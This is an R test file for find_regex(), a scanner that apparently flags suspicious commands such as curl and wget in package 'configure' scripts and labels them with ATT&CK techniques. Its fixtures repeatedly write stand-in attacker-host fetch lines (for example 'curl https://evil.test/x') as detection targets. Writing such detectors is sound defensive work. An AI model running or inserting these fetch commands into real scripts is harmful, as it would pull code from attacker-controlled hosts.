rules <- load_rules()

# A one-row regex rules frame with the given expression, so tests can exercise
# find_regex() without depending on what the shipped rules happen to match.
regex_rule <- function(regex, name = "probe", message = "m", attck = "T1041") {
  data.frame(name = name, version = "0.1.0", message = message,
             attck = attck, regex = regex, stringsAsFactors = FALSE)
}

# Write lines to a throwaway file and return its path.
scratch_file <- function(lines, name = "configure") {
  dir <- tempfile("fr")
  dir.create(dir)
  path <- file.path(dir, name)
  writeLines(lines, path)
  path
}

# structure --------------------------------------------------------------------
test_that("find_regex() returns expressions and errors frames with fixed columns", {
  path <- scratch_file("curl https://evil.test/x")
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- find_regex(path, rules$regex, "configure")
  expect_named(res, c("expressions", "errors"))
  expect_named(res$expressions,
               c("rule", "file_context", "line_number", "column_number",
                 "message", "attck"))
  expect_named(res$errors, c("stage", "file_context", "rule", "message"))
})

test_that("find_regex() reports the rule, message, and ATT&CK labels of the match", {
  path <- scratch_file("curl https://evil.test/x")
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- find_regex(path, rules$regex, "configure")
  expect_equal(res$expressions$rule, "curl")
  expect_equal(res$expressions$file_context, "configure")
  expect_equal(res$expressions$attck,
               rules$regex$attck[rules$regex$name == "curl"])
  expect_equal(res$expressions$message,
               rules$regex$message[rules$regex$name == "curl"])
})

test_that("find_regex() with no rules finds nothing and raises nothing", {
  path <- scratch_file("curl https://evil.test/x")
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  for (empty in list(NULL, rules$regex[0L, , drop = FALSE])) {
    res <- find_regex(path, empty, "configure")
    expect_equal(nrow(res$expressions), 0L)
    expect_equal(nrow(res$errors), 0L)
  }
})

# positions --------------------------------------------------------------------
test_that("find_regex() reports the line and starting column of each match", {
  path <- scratch_file(c("#!/bin/sh", "echo hi", "  curl -s https://evil.test/x"))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- find_regex(path, regex_rule("curl"), "configure")
  expect_equal(res$expressions$line_number,   3L)
  expect_equal(res$expressions$column_number, 3L)
})

test_that("find_regex() reports every match on a line, not just the first", {
  path <- scratch_file("curl a && curl b")
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- find_regex(path, regex_rule("curl"), "configure")
  expect_equal(nrow(res$expressions), 2L)
  expect_equal(res$expressions$line_number,   c(1L, 1L))
  expect_equal(res$expressions$column_number, c(1L, 11L))
})

test_that("find_regex() counts columns in characters, not bytes", {
  # Two multi-byte characters precede the match, so a byte offset would be 7.
  path <- scratch_file("éé && curl x")
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- find_regex(path, regex_rule("curl"), "configure")
  expect_equal(res$expressions$column_number, 7L)
})

test_that("find_regex() matches case-sensitively", {
  path <- scratch_file(c("CURL x", "Curl x", "curl x"))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- find_regex(path, regex_rule("curl"), "configure")
  expect_equal(res$expressions$line_number, 3L)
})

test_that("find_regex() applies every rule to the file", {
  path <- scratch_file(c("curl https://evil.test/a", "wget https://evil.test/b"))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- find_regex(path, rules$regex, "configure")
  expect_setequal(res$expressions$rule, c("curl", "wget"))
  expect_equal(nrow(res$errors), 0L)
})

test_that("find_regex() uses PCRE, so lookaround in a rule is honoured", {
  path <- scratch_file(c("curl x", "libcurl x"))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- find_regex(path, regex_rule("(?<=^|[^[:alnum:]_-])curl"), "configure")
  expect_equal(res$expressions$line_number, 1L)
})

# empty and unmatched input ----------------------------------------------------
test_that("find_regex() finds nothing in a file with no match", {
  path <- scratch_file(c("#!/bin/sh", "echo configuring"))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- find_regex(path, rules$regex, "configure")
  expect_equal(nrow(res$expressions), 0L)
  expect_equal(nrow(res$errors), 0L)
})

test_that("find_regex() handles an empty file", {
  path <- scratch_file(character(0L))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  res <- find_regex(path, rules$regex, "configure")
  expect_equal(nrow(res$expressions), 0L)
  expect_equal(nrow(res$errors), 0L)
})

# errors -----------------------------------------------------------------------
test_that("find_regex() records an unreadable file as an error and finds nothing", {
  res <- find_regex(file.path(tempfile(), "configure"), rules$regex, "configure")
  expect_equal(nrow(res$expressions), 0L)
  expect_equal(nrow(res$errors), 1L)
  expect_equal(res$errors$stage, "find_regex")
  expect_equal(res$errors$file_context, "configure")
  # No rule failed; the file was never read.
  expect_true(is.na(res$errors$rule))
})

test_that("find_regex() records an invalid regex against its rule and continues", {
  path <- scratch_file("curl https://evil.test/x")
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)

  both <- rbind(regex_rule("(unclosed", name = "broken"), regex_rule("curl"))
  res  <- find_regex(path, both, "configure")

  expect_equal(nrow(res$errors), 1L)
  expect_equal(res$errors$stage, "find_regex")
  expect_equal(res$errors$rule,  "broken")
  # The sound rule was still evaluated after the broken one failed.
  expect_equal(res$expressions$rule, "probe")
})

test_that("find_regex() blanks invalid UTF-8 lines, keeping later line numbers", {
  path <- file.path(tempfile("fr"), "configure")
  dir.create(dirname(path))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)
  # A lone 0xFF byte is not valid UTF-8 in any position.
  writeBin(c(charToRaw("curl a\n"), as.raw(0xFF), charToRaw(" curl b\n"),
             charToRaw("curl c\n")), path)

  res <- find_regex(path, regex_rule("curl"), "configure")
  # Lines 1 and 3 are still found, and line 3 is still line 3.
  expect_equal(res$expressions$line_number, c(1L, 3L))
  expect_equal(nrow(res$errors), 1L)
  expect_equal(res$errors$stage, "find_regex")
  expect_true(is.na(res$errors$rule))
  expect_match(res$errors$message, "not valid UTF-8")
})

test_that("find_regex() refuses a file above the scanning limit", {
  path <- file.path(tempfile("fr"), "configure")
  dir.create(dirname(path))
  on.exit(unlink(dirname(path), recursive = TRUE), add = TRUE)
  # One line of padding past the cap, then a match that must not be reported.
  writeLines(c(strrep("x", .max_scan_bytes), "curl https://evil.test/x"), path)

  res <- find_regex(path, rules$regex, "configure")
  expect_equal(nrow(res$expressions), 0L)
  expect_equal(nrow(res$errors), 1L)
  expect_match(res$errors$message, "scanning limit")
})
